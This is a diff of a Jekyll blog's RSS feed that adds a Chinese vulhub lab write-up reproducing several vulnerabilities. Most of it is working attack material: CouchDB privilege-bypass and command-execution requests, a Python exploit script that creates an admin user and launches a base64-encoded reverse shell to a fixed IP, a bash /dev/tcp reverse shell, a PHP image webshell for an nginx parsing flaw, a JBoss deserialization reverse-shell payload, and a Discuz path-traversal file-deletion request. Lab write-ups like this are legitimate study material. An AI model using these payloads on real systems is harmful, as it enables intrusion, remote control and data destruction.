@@ -5,9 +5,360 @@
     <description>Walking to Dalao。</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 04 Jun 2019 15:43:30 +0800</pubDate>
-    <lastBuildDate>Tue, 04 Jun 2019 15:43:30 +0800</lastBuildDate>
+    <pubDate>Sun, 16 Jun 2019 20:01:45 +0800</pubDate>
+    <lastBuildDate>Sun, 16 Jun 2019 20:01:45 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>vulhub漏洞复现</title>
+        <description>&lt;h2 id=&quot;couchdb-垂直权限绕过漏洞cve-2017-12635&quot;&gt;Couchdb 垂直权限绕过漏洞（CVE-2017-12635）&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:couchdb/CVE-2017-12635&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞复现&quot;&gt;漏洞复现：&lt;/h3&gt;
+
+&lt;h4 id=&quot;发送创建用户的请求包&quot;&gt;发送创建用户的请求包&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;PUT /_users/org.couchdb.user:username HTTP/1.1
+
+Host: your-ip:5984
+
+Accept: */*
+
+Accept-Language: en
+
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+Connection: close
+
+Content-Type: application/json
+
+Content-Length: 96
+
+{
+
+  &quot;type&quot;: &quot;user&quot;,
+
+  &quot;name&quot;: &quot;username&quot;,
+
+  &quot;roles&quot;: [&quot;_admin&quot;],
+
+  &quot;password&quot;: &quot;password&quot;
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;服务器返回错误，仅允许admin用户添加用户&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cfe35326689f17529.png&quot; alt=&quot;5cfe35326689f17529&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;重复发送roles参数，成功绕过限制，创建用户&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;PUT /_users/org.couchdb.user:username HTTP/1.1
+
+Host: your-ip:5984
+
+Accept: */*
+
+Accept-Language: en
+
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+Connection: close
+
+Content-Type: application/json
+
+Content-Length: 111
+
+{
+
+  &quot;type&quot;: &quot;user&quot;,
+
+  &quot;name&quot;: &quot;username&quot;,
+
+  &quot;roles&quot;: [&quot;_admin&quot;],
+
+  &quot;roles&quot;:[],
+
+  &quot;password&quot;: &quot;password&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功创建用户&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cfe365ebd34e80865.png&quot; alt=&quot;5cfe365ebd34e80865&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;登陆成功&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cfe364f25d8a64339.png&quot; alt=&quot;5cfe364f25d8a64339&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;couchdb-任意命令执行漏洞cve-2017-12636&quot;&gt;Couchdb 任意命令执行漏洞（CVE-2017-12636）&lt;/h2&gt;
+
+&lt;h3 id=&quot;漏洞复现-1&quot;&gt;漏洞复现：&lt;/h3&gt;
+
+&lt;h4 id=&quot;version-160&quot;&gt;Version 1.6.0&lt;/h4&gt;
+
+&lt;p&gt;在CVE-2017-12635的基础上进行任意命令执行操作&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT 'http://co0ontty:password@your-ip:5984/_config/query_servers/cmd' -d '&quot;id &amp;gt;/tmp/success&quot;'
+
+curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'
+curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}'
+curl -X POST 'http://co0ontty:password@your-ip:5984/vultest/_temp_view?limit=10' -d '{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}' -H 'Content-Type:application/json'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中 co0ontty:password为用户名和密码&lt;/p&gt;
+
+&lt;p&gt;第一个请求是添加一个名字为&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;，其中&lt;code class=&quot;highlighter-rouge&quot;&gt;id &amp;gt;/tmp/success&lt;/code&gt;为后面要执行的命令&lt;/p&gt;
+
+&lt;p&gt;第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。&lt;/p&gt;
+
+&lt;p&gt;第四个请求就是在这个Database里进行查询，因为我将language设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;，这里就会用到我第一步里添加的名为&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;，最后触发命令执行。&lt;/p&gt;
+
+&lt;h4 id=&quot;version-210&quot;&gt;Version 2.1.0&lt;/h4&gt;
+
+&lt;p&gt;Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问&lt;code class=&quot;highlighter-rouge&quot;&gt;/_membership&lt;/code&gt;即可：&lt;/p&gt;
+
+&lt;p&gt;第一个请求修改为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT http://co0ontty:password@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '&quot;id &amp;gt;/tmp/success&quot;'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第二、三个请求不变：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'
+
+curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于Couchdb 2.x删除了&lt;code class=&quot;highlighter-rouge&quot;&gt;_temp_view&lt;/code&gt;，所以我们为了触发&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;中定义的命令，需要添加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;_view&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;第四个请求修改为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT http://co0ontty:password@your-ip:5984/vultest/_design/vul -d '{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}' -H &quot;Content-Type: application/json&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;增加&lt;code class=&quot;highlighter-rouge&quot;&gt;_view&lt;/code&gt;的同时即触发了&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;中的命令。&lt;/p&gt;
+
+&lt;p&gt;也可以使用python将这一过程连贯运行，并得到反弹shell的效果&lt;/p&gt;
+
+&lt;p&gt;补充：&lt;/p&gt;
+
+&lt;p&gt;linux环境下可以通过下面这个命令实现反弹shell&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;sh -i &amp;gt;&amp;amp; /dev/tcp/47.102.143.147/222 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;/dev/[tcp|upd]/host/port是Linux设备里面比较特殊的文件，读取或写入相当于建立socket调用 
+由于其特殊性，命令执行后依旧无法找到/dev/tcp目录更不要说下面的文件了&lt;br /&gt;
+注意，这里”&amp;amp;”在Linux shell中表示后台运行，当然这里0&amp;gt;&amp;amp;1不是这样,对于&amp;amp;1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO&lt;/p&gt;
+
+&lt;p&gt;2&amp;gt;&amp;amp;1形式用于重定向，2&amp;gt;表示错误重定向，&amp;amp;1表示标准输出；以ls &amp;gt;/dev/null 2&amp;gt;&amp;amp;1为例，2&amp;gt;&amp;amp;1是将标准出错重定向到标准输出，不过在这里又被重定向到了/dev/null这个无底洞里
+这里有一个问题：为什么2&amp;gt;&amp;amp;1要写在后面，以command &amp;gt;file 2&amp;gt;&amp;amp;1为例，首先是command &amp;gt; file将标准输出重定向到file中， 2&amp;gt;&amp;amp;1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中 
+其实还有一个问题，既然2&amp;gt;表示错误重定向，那么0&amp;gt;表示什么呢？查阅资料发现在Linux下输入输出重定向有三个值，其中2已经说过是标准错误信息输出，那0则是标准输入，1则为标准输出了。说到这里，其实又引出了一个新的问题，我们知道&amp;lt;才是表示输入的，那为何这里却是如此形式，按说就应该是2了，或者说这里0就已经是输入了，然后直接使用&amp;gt;进行输出，不是很清楚请大牛指点啊&lt;/p&gt;
+
+&lt;p&gt;exp.py:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests.auth&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTPBasicAuth&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://47.102.143.147:5984'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;sh -i &amp;gt;&amp;amp; /dev/tcp/47.102.143.147/222 0&amp;gt;&amp;amp;1&quot;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# session.proxies = {
+#     'http': 'http://127.0.0.1:8085'
+# }
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/_users/org.couchdb.user:co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''{
+  &quot;type&quot;: &quot;user&quot;,
+  &quot;name&quot;: &quot;co0ontty&quot;,
+  &quot;roles&quot;: [&quot;_admin&quot;],
+  &quot;roles&quot;: [],
+  &quot;password&quot;: &quot;co0ontty&quot;
+}'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTPBasicAuth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# print (session.auth)
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;bash -c '{echo,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s}|{base64,-d}|{bash,-i}'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# print (command)
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/_config/query_servers/cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/_membership'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'all_nodes'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/_node/{}/_config/query_servers/cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty/test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{&quot;_id&quot;: &quot;id&quot;}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty/_temp_view?limit=10'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty/_design/test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;co0ontty&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;nginx解析漏洞&quot;&gt;NGINX解析漏洞&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:nginx/nginx_parsing_vulnerability&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;漏洞成因：用户配置不当造成的解析漏洞。&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞复现-2&quot;&gt;漏洞复现：&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cffa56981f5625236.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;制作php的图片马进行上传，利用解析漏洞将图片马当做php解析并运行。&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;copy &lt;/span&gt;1.jpg /a + shell.php /b shell.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;上传图片马，获得上传后的文件物理路径，访问相应的web路径（&lt;a href=&quot;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg&quot;&gt;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg&lt;/a&gt;）获得图片&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cffa665698a720426.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;利用解析漏洞访问（&lt;a href=&quot;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php&quot;&gt;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php&lt;/a&gt;）成功解析图片为php&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cffa7499b31532778.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;jboss-5x6x-反序列化漏洞-cve-2017-12149&quot;&gt;JBoss 5.x/6.x 反序列化漏洞 （CVE-2017-12149）&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:jboss/CVE-2017-12149&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;漏洞成因：该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。&lt;/p&gt;
+
+&lt;p&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;/invoker/readonly&lt;/code&gt;请求中，服务器将用户提交的POST内容进行了Java反序列化&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d005ee4c701964038.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用常规的Java反序列化漏洞的测试方法来复现该漏洞。&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞复现-3&quot;&gt;漏洞复现：&lt;/h3&gt;
+
+&lt;p&gt;访问&lt;a href=&quot;http://47.102.143.147:8080/invoker/readonly&quot;&gt;http://47.102.143.147:8080/invoker/readonly&lt;/a&gt;发现返回值为500，确定漏洞存在&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d00eee777d7b74150.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用Java反序列化利用工具JavaDeserH2HC.zip（http://scan.javasec.cn/java/JavaDeserH2HC.zip） 生成poc.ser&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#编译运行&lt;/span&gt;
+javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
+&lt;span class=&quot;c1&quot;&gt;#生成shell反弹poc&lt;/span&gt;
+java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 47.102.143.147:222
+使用curl向服务器发送POST请求（@filename,从文件中读取数据（包括换行符），将读取的数据进行URL编码，然后发送给HTTP服务器）
+&lt;span class=&quot;nb&quot;&gt;curl &lt;/span&gt;http://47.102.143.147:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d00edd1279f283233.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;discuzx-34-任意文件删除漏洞&quot;&gt;Discuz!X ≤3.4 任意文件删除漏洞&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:discuz/x3.4-arbitrary-deletion&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞复现-4&quot;&gt;漏洞复现：&lt;/h3&gt;
+
+&lt;p&gt;登陆Discuz!X搭建的论坛，注册账号，在个人设置界面使用POST发送请求：&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;birthprovince&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=../../../&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;profilesubmit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formhash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e3807b55&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
